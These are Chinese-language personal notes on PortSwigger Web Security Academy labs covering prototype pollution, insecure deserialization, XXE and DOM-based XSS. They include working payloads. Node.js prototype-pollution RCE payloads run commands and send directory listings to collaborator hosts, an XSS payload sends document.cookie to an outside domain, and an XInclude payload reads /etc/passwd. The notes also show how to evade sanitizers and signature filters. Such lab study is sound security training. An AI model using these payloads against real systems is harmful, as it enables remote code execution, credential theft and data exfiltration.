exploit 成功弹窗![image-20250724223310337](portswigger.assets/image-20250724223310337.png)

获取cookie

![image-20250724223440167](portswigger.assets/image-20250724223440167.png)





## 103.实验室：通过浏览器 API 进行客户端原型污染

![image-20250724233009749](portswigger.assets/image-20250724233009749.png)

1.![image-20250724233259146](portswigger.assets/image-20250724233259146.png)

找到污染源

2.查看源代码找gadget

![image-20250724233527952](portswigger.assets/image-20250724233527952.png)

同时找到了api的定义覆盖

`Object.defineProperty(obj, prop, descriptor)` 用于定义对象的属性，第三个参数是一个 **属性描述符对象**，可以设置属性的行为，比如 `value`, `writable`, `configurable`, `enumerable` 等。

3.提前污染value参数![image-20250724233847533](portswigger.assets/image-20250724233847533.png)

测试成功换成data:,alert(1)就成功了



## 104.实验室：通过服务器端原型污染进行权限提升

![image-20250725001255127](portswigger.assets/image-20250725001255127.png)

登录![image-20250725001508789](portswigger.assets/image-20250725001508789.png)

抓后面那个包发送![image-20250725001658124](portswigger.assets/image-20250725001658124.png)

发现有赢藏参数

直接改发现没用![image-20250725001802566](portswigger.assets/image-20250725001802566.png)

![image-20250725002349401](portswigger.assets/image-20250725002349401.png)

最后这么改成功了

![image-20250725002635335](portswigger.assets/image-20250725002635335.png)



## 105.实验室：检测服务器端原型污染，无需污染属性反射

1. POST /?__proto__[status]=432 HTTP/1.1
   Content-Type: application/json

2. ?__proto__.json spaces=10（在 Burp Suite 中测试时，一定要切换到 **Raw** 标签查看返回的原始 JSON；）

3. "role":"+AGYAbwBv

   "__proto__":{        "content-type": "application/json; charset=utf-7"    }

    ==>"role":"foo"

![image-20250725013402669](portswigger.assets/image-20250725013402669.png)

1.![image-20250725013944354](portswigger.assets/image-20250725013944354.png)

故意删一个逗号 看到报错信息变成我污染的432

2.

![image-20250725014148599](portswigger.assets/image-20250725014148599.png)

把json spaces跳到20 看raw里面 果然缩径变了

3。好像行不通

![image-20250725014732725](portswigger.assets/image-20250725014732725.png)![image-20250725014742692](portswigger.assets/image-20250725014742692.png)



## 106.实验室：绕过有缺陷的输入过滤器来防止服务器端原型污染

1. `__proto__` → `__pr%6Fto__`（使用 URL 编码）

   `"__proto__"` → `'__' + 'proto__'`（JavaScript 运行时拼接）

   双写

2. 使用 constructor 绕过过滤

   {
     "constructor": {
       "prototype": {
         "polluted": "yes"
       }
     }
   }

![image-20250725020304294](portswigger.assets/image-20250725020304294.png)

![image-20250725022114723](portswigger.assets/image-20250725022114723.png)

用constructor绕过



## 107.实验室：通过服务器端原型污染执行远程代码

1：

```json
"__proto__": {
    "shell": "node",  // 指定子进程使用node作为shell
    "NODE_OPTIONS": "--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```

`NODE_OPTIONS` 是一个环境变量，允许开发者为每个 Node 子进程设置默认的命令行参数。

`"shell": "node"`：确保使用 Node shell 运行命令（不是 `/bin/sh`）。

`"NODE_OPTIONS"`：传入了 `--inspect=...`，这个参数会让新建的 Node 子进程自动去连这个地址。

转义：假设安全工具在查 “`abc123`” 这个特征：

- 你直接发送`abc123`，会被拦截。
- 你发送`ab\"c1\"23`，安全工具看到的是`ab"c1"23`，无法匹配`abc123`，于是放行。
- 目标系统会自动去掉转义，得到`abc123`，正常执行功能。

转义在这里就像给特征字符串 “加了干扰项”，让检测器 “认不出”，但目标能 “看懂”。

2：

在 Node.js 中，`child_process.fork()` 用于**创建一个子进程来执行新的 Node.js 脚本**。它接受一些参数，其中包括一个 `options` 对象。

这个 `options` 对象有一个重要字段：

- `execArgv`: 它是一个字符串数组，表示传给子进程的 Node.js 命令行参数，比如 `--inspect`、`--eval` 等。

```json
{
  "__proto__": {
    "execArgv": ["--eval=require('fs').writeFileSync('/tmp/pwned', 'hacked')"]
  }
}
```

![image-20250725203420758](portswigger.assets/image-20250725203420758.png)

用sspps扩展进行扫描，找到注入点![image-20250725205800661](portswigger.assets/image-20250725205800661.png)

![image-20250725204827738](portswigger.assets/image-20250725204827738.png)

 用json spaces确定污染

![image-20250725212518092](portswigger.assets/image-20250725212518092.png)

注入RCE后去触发他 发送![image-20250725212538386](portswigger.assets/image-20250725212538386.png)

然后这里污染一直没反应 到；另一个注入点

![image-20250725212647074](portswigger.assets/image-20250725212647074.png)

尝试执行whoami

![image-20250725213051857](portswigger.assets/image-20250725213051857.png)

![image-20250725213036348](portswigger.assets/image-20250725213036348.png)

直接删除"__proto__": {
    "execArgv": ["--eval=require('child_process').execSync('ping $(rm -f /home/carlos/morale.txt).lc1okipvqqufzogcvlo0jn3p0g69u0ip.oastify.com')"]
  }



## 108.实验室：通过服务器端原型污染泄露敏感数据

### 💥 背景：`execSync()` 如何导致远程代码执行（RCE）

Node.js 的 `child_process.execSync(command, options)` 是一个**同步执行 shell 命令**的接口，可以指定：

- `command`：要执行的命令字符串。
- `options.input`：会被写入 stdin，传给 shell 解释执行。
- `options.shell`：指定使用哪个 shell（默认是系统 shell，比如 `/bin/sh`）。

如果开发者使用 `execSync()`，但没有显式指定 `input` 或 `shell`，而你又能通过**原型污染**修改这两个字段，就可以控制输入内容和执行环境，从而劫持命令执行流程，实现 RCE。

```
"shell":"vim",

 "input":":! <command>\n"  //:!是让vim解析命令，\n模拟换行 执行
```

![image-20250725215947142](portswigger.assets/image-20250725215947142.png)

先找到污染源![image-20250725221526605](portswigger.assets/image-20250725221526605.png)

先看目录有什么

"__proto__":{
"shell":"vim",
"input":":! nslookup $(ls /home/carlos).9iscq6vjwe035cm019uopb9d64cy0poe.oastify.com\n"}

![image-20250725223433979](portswigger.assets/image-20250725223433979.png)

再cat打开![image-20250725223559853](portswigger.assets/image-20250725223559853.png)



# 14.不安全的反序列化



## 109.实验室：修改序列化对象

![image-20250726205644972](portswigger.assets/image-20250726205644972.png)

登录账号查看cookie

![image-20250726205803187](portswigger.assets/image-20250726205803187.png)

直接修改权限

![image-20250726205855314](portswigger.assets/image-20250726205855314.png)

发包即可



## 110.实验室：修改序列化数据类型

![image-20250726210656562](portswigger.assets/image-20250726210656562.png)

利用php弱比较

原cookie：![image-20250726210802606](portswigger.assets/image-20250726210802606.png)

看到token都是字母 如果我把tokem换成0去登录 就能绕过弱比较0==“string”

![image-20250726211959932](portswigger.assets/image-20250726211959932.png)



## 111.实验室：利用应用程序功能来利用不安全的反序列化

![image-20250726212303779](portswigger.assets/image-20250726212303779.png)

扫到反序列化漏洞

![image-20250726212655174](portswigger.assets/image-20250726212655174.png)

![image-20250726213459901](portswigger.assets/image-20250726213459901.png)



![image-20250726214334027](portswigger.assets/image-20250726214334027.png)

修改路径即可



## 112.实验：PHP 中的任意对象注入

![image-20250726220516092](portswigger.assets/image-20250726220516092.png)

![image-20250726221217615](portswigger.assets/image-20250726221217615.png)

![image-20250726221300093](portswigger.assets/image-20250726221300093.png)

![image-20250726224150687](portswigger.assets/image-20250726224150687.png)



## 113.实验：利用 Apache Commons 实现 Java 反序列化

使用工具

![image-20250726235351126](portswigger.assets/image-20250726235351126.png)

放入cookie即可



## 114.实验室：利用预先构建的小工具链来利用 PHP 反序列化

![image-20250727021906242](portswigger.assets/image-20250727021906242.png)





## 115.实验：使用已记录的小工具链来利用 Ruby 反序列化

![image-20250727022409947](portswigger.assets/image-20250727022409947.png)



![image-20250727022906487](portswigger.assets/image-20250727022906487.png)

扫到漏洞框架

去找脚本poc![image-20250727025424984](portswigger.assets/image-20250727025424984.png)

在线工具上修改并执行

![image-20250727025452743](portswigger.assets/image-20250727025452743.png)



放入再发包 有时候要url编码

![image-20250727025351029](portswigger.assets/image-20250727025351029.png)



## 116.实验室：为 Java 反序列化开发自定义gadget链

![image-20250727030304776](portswigger.assets/image-20250727030304776.png)

扫描识别为java漏洞

![image-20250727030500662](portswigger.assets/image-20250727030500662.png)

有源码提示

![image-20250727030555775](portswigger.assets/image-20250727030555775.png)

打开得到源码

```java
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

好像没有什么能用的，再看上级目录backup 找到另一个文件

![image-20250727031226525](portswigger.assets/image-20250727031226525.png)

```java
public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

这个部分里有能攻击的点

思路是结合sql注入拿到admin的密码 



## 15.基本技能

## 117.实验室：通过有针对性的扫描快速发现漏洞

![image-20250728014525578](portswigger.assets/image-20250728014525578.png)

![image-20250728015338014](portswigger.assets/image-20250728015338014.png)



![image-20250728015123423](portswigger.assets/image-20250728015123423.png)

尝试file伪协议读取文件

![image-20250728015457204](portswigger.assets/image-20250728015457204.png)

不能访问，一些应用程序接收客户端提交的数据，在服务器端将其嵌入到 XML 文档中，然后解析该文档。例如，客户端提交的数据被放入后端 SOAP 请求中，然后由后端 SOAP 服务进行处理。

在这种情况下，您无法执行经典的 XXE 攻击，因为您无法控制整个 XML 文档，因此无法定义或修改`DOCTYPE`元素。但是，您可以使用`XInclude`XXE 来代替。`XInclude`它是 XML 规范的一部分，允许从子文档构建 XML 文档。您可以将`XInclude`攻击置于 XML 文档中的任何数据值中，因此即使您仅控制服务器端 XML 文档中的单个数据项，也可以执行攻击。

要执行`XInclude`攻击，你需要引用`XInclude`命名空间并提供要包含的文件的路径。例如：

```html
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

![image-20250728015917335](portswigger.assets/image-20250728015917335.png)



## 118.实验室：扫描非标准数据结构

![image-20250728021005800](portswigger.assets/image-20250728021005800.png)

登录界面感觉不对劲![image-20250728021401837](portswigger.assets/image-20250728021401837.png)

有明文形式

把前后两部分都扫描一遍

分别扫到了XSS DOM和带外

![image-20250728021938547](portswigger.assets/image-20250728021938547.png)

![image-20250728021945503](portswigger.assets/image-20250728021945503.png)

直接利用模板

**SVG 标签**：SVG 是一种图形格式，可以嵌入 HTML 文档中。在 SVG 中，可以定义图形元素，并在其中使用 JavaScript 事件。通过 `onload` 事件，攻击者可以在 SVG 图像加载时触发 JavaScript 代码。

**`onload` 事件**：当浏览器加载图像或某个资源时，会触发 `onload` 事件。攻击者利用这个事件来执行自定义的 JavaScript 代码。

**`fetch` 请求**：攻击者使用 JavaScript 的 `fetch` API 发起一个 HTTP 请求，将当前页面的 `document.cookie`（即用户的 Cookie）发送到攻击者控制的服务器。

![image-20250728023952350](portswigger.assets/image-20250728023952350.png)

拼接上要获取的cookie，其实这样也是可以的

```javascript
<img src=1 onerror=fetch//zadjuv5cdeehna88wat1hr9noeu7iz6o.oastify.com/?cookie=${encodeURIComponent(document.cookie)}>
```

轮询后查看到![image-20250728024034759](portswigger.assets/image-20250728024034759.png)





# 16.基于 DOM 的漏洞



## 119.实验室：基于 DOM 的开放重定向

![image-20250729173646281](portswigger.assets/image-20250729173646281.png)

![image-20250729174324322](portswigger.assets/image-20250729174324322.png)

审计代码找到重定向的漏洞

构造payload

```
https://..../post?postId=1&url=https://exploit-0af5001d042f514c80781b310175003e.exploit-server.net/exploit

```



## 120.实验：基于 DOM 的 cookie 操作

![image-20250729175456319](portswigger.assets/image-20250729175456319.png)

![image-20250729181957374](portswigger.assets/image-20250729181957374.png)

抓到一个包

![image-20250729175914773](portswigger.assets/image-20250729175914773.png)

最后一个参数会生成链接

![image-20250729175958197](portswigger.assets/image-20250729175958197.png)



第一步利用![image-20250729180455563](portswigger.assets/image-20250729180455563.png)

可以成功重定向到攻击链接

第二部保存poc

![image-20250729180700949](portswigger.assets/image-20250729180700949.png)

发现定向后能调用print

第三步结合到网页

![image-20250729182558357](portswigger.assets/image-20250729182558357.png)



## 121.实验室：利用 Web 消息进行 DOM XSS

![image-20250729190634072](portswigger.assets/image-20250729190634072.png)

翻到关键源码![image-20250729191506305](portswigger.assets/image-20250729191506305.png)

![image-20250729192121970](portswigger.assets/image-20250729192121970.png)

1.在 `iframe` 的上下文中：

- `this` 指的是这个 iframe 本身
- `this.contentWindow` 表示 iframe 中嵌套页面的 **window 对象**

也就是说，它代表 **iframe 里面的 JavaScript 执行环境**

2.window.postMessage(message, targetOrigin);
解释：

'print()' 是消息内容

'*' 表示不管 iframe 是什么来源，都发送这个消息



## 122.实验：使用 Web 消息和 JavaScript URL 的 DOM XSS

![image-20250729193338253](portswigger.assets/image-20250729193338253.png)

![image-20250729193656305](portswigger.assets/image-20250729193656305.png)

构造框架还是一样

<if。。 src="https:。。。/" onload="this.contentWindow.postMessage('   ','*')">

然后要用 javascript: 伪协议绕过

![image-20250729195043363](portswigger.assets/image-20250729195043363.png)

然后注释符注释掉要匹配的http：



## 123.实验室：使用 Web 消息和 JSON.parse

![image-20250729195249803](portswigger.assets/image-20250729195249803.png)

![image-20250729195802450](portswigger.assets/image-20250729195802450.png)

审计代码，要利用的是第二个属性

![image-20250729201217682](portswigger.assets/image-20250729201217682.png)

应该还要转义

![image-20250729202830895](portswigger.assets/image-20250729202830895.png)



## 124.实验：利用 DOM 破坏来启用 XSS

![image-20250729223616188](portswigger.assets/image-20250729223616188.png)

DOM破坏，即HTML注入，像原型污染 就是自己构造一个DOM引用的id，name 然后覆盖原值

发布评论看看

![image-20250729224509550](portswigger.assets/image-20250729224509550.png)

![image-20250729224910123](portswigger.assets/image-20250729224910123.png)

可以看到网页是会调用这个头像链接的

要做的就是让网页调用我的链接

第一步尝试

![image-20250729230117775](portswigger.assets/image-20250729230117775.png)

最开始会想为什么要注入两个 直接注入第二个不行吗

举个例子：

假设你只注入一个标签：

```html
<a id="someObject" name="url" href="恶意脚本地址">
```

这时候，`window.someObject`就等于这个`<a>`标签本身（一个 DOM 元素）。

现在看代码里要用到的`someObject.url`—— 它想取的是`someObject`这个 “东西” 的`url`属性。

但问题是：**`<a>`标签本身没有叫`url`的属性**。

<a>标签天生有的属性是href（链接地址）、name（名称）、id（标识）这些，根本没有url这个自带属性。所以当你写someObject.url时，浏览器会说 “找不到这个属性”，结果就是undefined。

那`name="url"`有什么用呢？它只是给这个`<a>`标签起了个名叫 “url”，但这和 “`someObject`的`url`属性” 是两码事。就像你给一个人起名叫 “张三”，不代表他身上有一个叫 “张三” 的零件。



而当你注入两个同`id`的标签时，情况变了：

```html
<a id="someObject"><a id="someObject" name="url" href="恶意脚本地址">
```



此时`window.someObject`不再是单个标签，而是一个 “集合”（类似装了两个标签的盒子）。这个 “盒子” 有个特殊规则：**如果盒子里有个元素的`name`是 “xxx”，那么`盒子.xxx`就等于这个元素**。

所以第二个标签的`name="url"`，会让`someObject.url`直接指向这个标签。然后代码里取`someObject.url`时，拿到的是这个标签，再读它的`href`属性（标签本身就有`href`），就得到了恶意地址。

简单说：



- 单个标签：`someObject`是个标签，它没有`url`属性 → 失败。
- 两个标签：`someObject`是个 “盒子”，盒子里有个叫 “url” 的标签 → `someObject.url`能拿到这个标签，再读它的`href` → 成功。

r然后注意到源码中有dompurify来避免漏洞![image-20250729231237704](portswigger.assets/image-20250729231237704.png)然而，DOMPurify 允许你使用`cid:`不对双引号进行 URL 编码的协议。

- ```html
  <img src="cid:logo@example.com">
  ```

  

  这里的`cid:logo@example.com`指向邮件中内嵌的、标识为`logo@example.com`的图片附件，邮件客户端会直接显示该附件，而无需从外部服务器加载。
  
  注入
  
  ```html
  <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
      
  ```
  
  &quot是引号的html转义，配合输出进行构造

### ![image-20250729233903383](portswigger.assets/image-20250729233903383.png)

### ![image-20250730015444995](portswigger.assets/image-20250730015444995.png)



## 125.实验室：破坏 DOM 属性以绕过 HTML 过滤器

🌪️ 攻击的关键点总结

`.attributes` 是 DOM 元素对象的一个**内建属性**，是浏览器自动加上的。

- 它代表的是这个 HTML 元素上的**所有属性**（如 `id`、`class`、onclick 等）的集合。

- 它是一个 **NamedNodeMap** 类型（可以当类数组处理）。(属性集合)

- 举个例子：

  ```html
  <button id="btn" class="blue" onclick="sayHi()">Click me</button>
  ```

  在 JS 中：

  ```javascript
  let el = document.getElementById('btn');
  console.log(el.attributes);  // 输出所有属性（id, class, onclick）
  console.log(el.attributes[0].name);  // id
  console.log(el.attributes[0].value); // btn
  ```

攻击者利用了两件事：

1. **浏览器允许你用 DOM 元素覆盖本应是属性的变量或属性名**（比如 `.attributes`）；
2. **前端过滤器依赖 `element.attributes.length` 来遍历属性**；
3. 通过构造一个 `<input id=attributes>`，把 `.attributes` 变成了一个 DOM 节点而不是属性集合；
4. 导致前端过滤器“以为”在检查属性，实则什么都没删；
5. 成功让恶意属性（如 `onclick=alert(1)`) 留在了页面中，最终被执行。

![image-20250730214543899](portswigger.assets/image-20250730214543899.png)

先看到HTMLJanitor 库，主要用于过滤和净化洗 HTML 内容，防止恶意代码注入（如 XSS 攻击），同时保持合法的 HTML 结构。

污染输入

![image-20250730222503114](portswigger.assets/image-20250730222503114.png)

![image-20250730222515811](portswigger.assets/image-20250730222515811.png)

可以看到评论变成了点击框，点击就会弹出print （2是没用input id=attribute污染的，就被过滤了）

接下来要想的是 让受害者点开钓鱼链接后会自动弹出弹窗

![image-20250730223409279](portswigger.assets/image-20250730223409279.png)

钓鱼链接：

![image-20250730223651517](portswigger.assets/image-20250730223651517.png)

应该是由于同源策略失败了

wp的方式是用自动聚焦加上挑战表单

### 💡HTML 注入评论内容：

```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

#### 含义：

1. `<form>` 是一个合法的 HTML 元素，过滤器通常不会拦。form表示一个表单，常用于收集用户输入
2. `id=x` 是设置这个 form 的 ID，供后续锚点跳转使用（`#x`）。
3. 添加了 `tabindex=0`：让该元素可以通过键盘 `Tab` 或聚焦方法（如 `.focus()`）来聚焦；
4. `onfocus=print()` 是当聚焦时调用浏览器的打印窗口（攻击行为）。

### 🚀Iframe 钓鱼触发器：

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/post?postId=3"
        onload="setTimeout(()=>this.src=this.src+'#x',500)">
```

作用分解：

- `iframe`：嵌入评论页面。			
- 初始 `src` 指向一篇包含恶意 form 的文章。
- `onload`：页面加载完成后触发。
- `setTimeout` 延迟 500ms，将当前 URL 加上锚点 `#x`，触发页面跳转到 `id=x` 的元素。

为什么要 `#x`？

跳转到有 `id="x"` 的表单时，这个表单因有 `tabindex=0`，会被自动聚焦，从而触发 `onfocus=print()`。

举一反三的话 还可以 这些和我的onclick一样 都需要受害者操作才可以 比如鼠标要悬浮到那里

```html
  <。。。form id=x onmouseenter=alert(1)><input id=attributes>
      <form id=x onmouseover=alert(1)><input id=attributes>
<form id=x onfocusin=alert(1)><input id=attributes>

```

# 17.跨站点脚本（XSS）



## 126.实验室：将 XSS 反射到未编码的 HTML 上下文中（Reflect）

![image-20250729162656740](portswigger.assets/image-20250729162656740.png)

![image-20250729162830331](portswigger.assets/image-20250729162830331.png)

![image-20250729163039803](portswigger.assets/image-20250729163039803.png)

这是常规方式

```javascript
 <svg/onload=alert(1);>
```

这个也是可以的

![image-20250729163129619](portswigger.assets/image-20250729163129619.png)

按要求构造 



## 127.实验：将 XSS 存储到 HTML 上下文中，无需任何编码（stored）

![image-20250729164534311](portswigger.assets/image-20250729164534311.png)

![image-20250729164701201](portswigger.assets/image-20250729164701201.png)

当发布一条评论后 看到网页元素中会有存储

找到位置后 如此构造 重新打开blog会有弹窗

![image-20250729164937097](portswigger.assets/image-20250729164937097.png)



## 128.实验：document.write使用源的接收器中的 DOM XSS  location.search

![image-20250730235004488](portswigger.assets/image-20250730235004488.png)

看到构造形式![image-20250730235855991](portswigger.assets/image-20250730235855991.png)

想用" onerror=alert(1)>// 但是好像无法直接构造 可能是能找到文件？

![image-20250731000833940](portswigger.assets/image-20250731000833940.png)

提前闭合就成功了![image-20250731001054684](portswigger.assets/image-20250731001054684.png)

或者"><svg onload=alert(1)> 都是可以的





## 129.实验：在接收器中使用select 元素内的document.write源进行DOM XSS`location.search`（DOM XSS in `document.write` sink using source `location.search` inside a select element）

![image-20250731015614034](portswigger.assets/image-20250731015614034.png)



找到相应的代码：

![image-20250731015751707](portswigger.assets/image-20250731015751707.png)

这是查询结果的html格式

于是构造（新加参数并闭合）

![image-20250731020247423](portswigger.assets/image-20250731020247423.png)

有弹窗但没solved 很奇怪 于是严谨的更改格式就可以了 闭合的时候加上</select>

![image-20250731020536034](portswigger.assets/image-20250731020536034.png)



## 130.实验：`innerHTML`使用源的接收器中的 DOM XSS`location.search`

![image-20250731150322510](portswigger.assets/image-20250731150322510.png)



先搜索一下看看html

![image-20250731151415332](portswigger.assets/image-20250731151415332.png)

构造

```html
</span><svg/onload=alert()>
```

![image-20250731151638630](portswigger.assets/image-20250731151638630.png)





## 131.实验：使用源在 jQuery 锚点`href`属性接收器中进行 DOM XSS`location.search`

![image-20250731151753066](portswigger.assets/image-20250731151753066.png)



![image-20250731152630972](portswigger.assets/image-20250731152630972.png)

将url随便输入![image-20250731152552906](portswigger.assets/image-20250731152552906.png)

发现已同步，利用的是back的链接

![image-20250731152605142](portswigger.assets/image-20250731152605142.png)

直接url构造即可

不好构造 直接用javascript伪协议：returnPath=javascript:alert(1)，随后一点back就会有弹窗



## 132.实验：使用 hashchange 事件在 jQuery 选择器接收器中引发 DOM XSS

![image-20250731161316404](portswigger.assets/image-20250731161316404.png)

找到有漏洞的代码处

![image-20250731161306184](portswigger.assets/image-20250731161306184.png)

分析代码,这本是用来打开blog的

构造poc![image-20250731162547310](portswigger.assets/image-20250731162547310.png)

发送后成功



## 133.实验：AngularJS 表达式中带有尖括号和双引号的 DOM XSS HTML 编码

![image-20250731163435547](portswigger.assets/image-20250731163435547.png)

AngularJS 是一个基于声明式模板的前端框架，它会解析 HTML 中的指令（如 `ng-app`, `ng-bind`, `ng-model`, `ng-click` 等），并执行其中绑定的数据或表达式。

而这个特性——**解析双花括号 `{{ }}` 表达式**，就可以被攻击者滥用，从而实现 **DOM 型 XSS**

随机输入测试,看到html,尖括号被编码

![image-20250731165313621](portswigger.assets/image-20250731165313621.png)

感觉像是模板注入了

测试成功![image-20250731165633854](portswigger.assets/image-20250731165633854.png)



尝试直接弹窗失败

![image-20250731165726583](portswigger.assets/image-20250731165726583.png)

于是搜索angularjs的模板注入方法

 可以用的:

| 内置变量                  | 说明                                         |
| ------------------------- | -------------------------------------------- |
| `$on`                     | `$scope` 的事件监听函数，可用作入口点        |
| `$eval`                   | 直接执行字符串表达式的函数                   |
| `$parent`, `$root`, `$id` | AngularJS 的作用域链中可以进一步访问其他对象 |
| `$watch`, `$apply`        | 用于绑定执行函数（可能用于持久化攻击）       |

例子:{{$eval.constructor('alert(1)')()}}

用{{constructor.constructor('alert(1)')()}}就能直接成功

constructor.constructor("alert(1)")()
等价于：
Function("alert(1)")()

![image-20250731170849282](portswigger.assets/image-20250731170849282.png)





## 134.实验室：反射 DOM XSS

![image-20250731172550051](portswigger.assets/image-20250731172550051.png)

随机输入测试字符 源码中找到并查看

![image-20250731173345988](portswigger.assets/image-20250731173345988.png)

这是响应![image-20250731173746057](portswigger.assets/image-20250731173746057.png)



看前端源码,找到注入的关键

![image-20250731173929956](portswigger.assets/image-20250731173929956.png)

通过简单的尝试，直接通过html反射xss基本是不可能了

![image-20250731220904267](portswigger.assets/image-20250731220904267.png)

接下来尝试构造json![image-20250731220918642](portswigger.assets/image-20250731220918642.png)

先尝试闭合search 然后注入alert 发现被转义了

![image-20250731221022251](portswigger.assets/image-20250731221022251.png)

那就再加个斜杠 反转义，大概是这样

![image-20250731221301563](portswigger.assets/image-20250731221301563.png)

但是不成功，因该是json解析的语法出问题了

把逗号 换个符号 比如&或者-或者|或者+都是可以的，就是为了拼接alert（）

![image-20250731221523863](portswigger.assets/image-20250731221523863.png)

就成功了![image-20250731221545224](portswigger.assets/image-20250731221545224.png)



## 135.实验室：存储型 DOM XSS

![image-20250731221850902](portswigger.assets/image-20250731221850902.png)

查看源码![image-20250731234124202](portswigger.assets/image-20250731234124202.png)

可以看到是过滤了尖括号

当 `replace()` 的第一个参数是**字符串**而非正则表达式时，它**只会替换第一个匹配的内容**。

由这个特性 构造成功

![image-20250731234925895](portswigger.assets/image-20250731234925895.png)

## **哪些接收器可能导致 DOM-XSS 漏洞？

以下是一些可能导致 DOM-XSS 漏洞的主要接收器：

```javascript
document.write() document.writeln() document.domain element.innerHTML element.outerHTML element.insertAdjacentHTML element.onevent
```

以下 jQuery 函数也是可能导致 DOM-XSS 漏洞的接收器：

```javascript
add() after() append() animate() insertAfter() insertBefore() before() html() prepend() replaceAll() replaceWith() wrap() wrapInner() wrapAll() has() constructor() init() index() jQuery.parseHTML() $.parseHTML()
```





## 136.实验室：反射型 XSS 进入 HTML 上下文，大多数标签和属性被阻止

![image-20250801000503883](portswigger.assets/image-20250801000503883.png)

尝试注入![image-20250801000937102](portswigger.assets/image-20250801000937102.png)

结果被屏蔽![image-20250801000953881](portswigger.assets/image-20250801000953881.png)

爆破一下什么被过滤了

居然都是可以输入的

![image-20250801001255196](portswigger.assets/image-20250801001255196.png)

 试试加入尖括号，得到我们想要的结果

![image-20250801001342687](portswigger.assets/image-20250801001342687.png)

试试body ，爆破事件，看看有没有事件可用

![image-20250801001939039](portswigger.assets/image-20250801001939039.png)随便选一个试试，

![image-20250801002002065](portswigger.assets/image-20250801002002065.png)

此时确实输入字符框时会有弹窗

接下来的问题就是怎么利用或构造组合能 不需要任何用户交互。在浏览器中调用此方法。

![image-20250801002731119](portswigger.assets/image-20250801002731119.png)

这些方法里 可以用onresize（最简单）

```html
<iframeee src="。。。。/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload="setTimeout(()=>this.style.width='100px',500)">
```

![image-20250801003944800](portswigger.assets/image-20250801003944800.png)



## 137.实验室：将反射式 XSS 注入 HTML 上下文，阻止除自定义标签之外的所有标签

![image-20250801004108503](portswigger.assets/image-20250801004108503.png)

按照lab描述 直接去利用自定义标签，

![image-20250801010319661](portswigger.assets/image-20250801010319661.png)

![image-20250801010306132](portswigger.assets/image-20250801010306132.png)

构造钓鱼链接 但显示链接不上 可能是有同源？

![image-20250801010538306](portswigger.assets/image-20250801010538306.png)

换个写法，直接跳转

![image-20250801010743390](portswigger.assets/image-20250801010743390.png)

就成功了



## 138.实验室：阻止事件处理程序和`href`属性的反射型 XSS

![image-20250801133852538](portswigger.assets/image-20250801133852538.png)

按照提示先简单注入
$$
<a>click me</a>
$$
![image-20250801134955203](portswigger.assets/image-20250801134955203.png)

没被拼比 我们的目的就是通过javascript伪协议执行alert

![image-20250801135128509](portswigger.assets/image-20250801135128509.png)

但是被屏蔽了![image-20250801135142065](portswigger.assets/image-20250801135142065.png)

 还是原来的思路 看看什么标签可以使用

![image-20250801135434590](portswigger.assets/image-20250801135434590.png)

查询一下animate 看看怎么使用

![image-20250801140047629](portswigger.assets/image-20250801140047629.png)

![image-20250801140054912](portswigger.assets/image-20250801140054912.png)

说明是一个svg的方法，那svg应该也是可以使用

测试![image-20250801140211722](portswigger.assets/image-20250801140211722.png)

但是看不到向量 用text去让他显示

![image-20250801140732966](portswigger.assets/image-20250801140732966.png)

![image-20250801141100318](portswigger.assets/image-20250801141100318.png)

![image-20250801141107714](portswigger.assets/image-20250801141107714.png)

到目前为止整理一下 svg是为了后面提供animate方法，a是提供超链接实现点击，text是让字符在svg中显示出来

后面要做的就是看看animate能不能提供href的功能

![image-20250801141855554](portswigger.assets/image-20250801141855554.png)

可以看到svg支持a 所以animate内可能能用href

![image-20250801142221712](portswigger.assets/image-20250801142221712.png)

![image-20250801142318748](portswigger.assets/image-20250801142318748.png)

构造完成后 点击click me即可调用alert



## 139.实验室：允许使用一些 SVG 标记的反射型 XSS

![image-20250801142953439](portswigger.assets/image-20250801142953439.png)

尝试测试svg的其他属性 发现都不能使用那就看看还有没有其他标签可用![image-20250801144242662](portswigger.assets/image-20250801144242662.png)

查一下

![image-20250801145703613](portswigger.assets/image-20250801145703613.png)



![image-20250801145622329](portswigger.assets/image-20250801145622329.png)



![image-20250801145905279](portswigger.assets/image-20250801145905279.png)

尝试只有animate能配合使用弹窗

![image-20250801150138092](portswigger.assets/image-20250801150138092.png)![image-20250801150206960](portswigger.assets/image-20250801150206960.png)



## 140.